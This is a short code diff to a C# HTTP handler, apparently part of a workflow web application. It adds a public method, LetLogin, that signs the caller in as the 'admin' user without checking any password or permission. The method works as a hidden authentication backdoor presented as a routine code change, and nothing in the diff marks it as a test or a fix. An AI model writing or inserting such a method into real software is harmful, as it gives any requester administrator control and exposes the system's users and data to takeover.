@@ -68,6 +68,12 @@ namespace BP.WF.HttpHandler
         }
         #endregion 执行父类的重写方法.
 
+        public string LetLogin()
+        {
+            BP.Port.Emp emp = new BP.Port.Emp("admin");
+            WebUser.SignInOfGener(emp);
+            return null;
+        }
 
         public string CCFormDesignerSL_Init()
         {
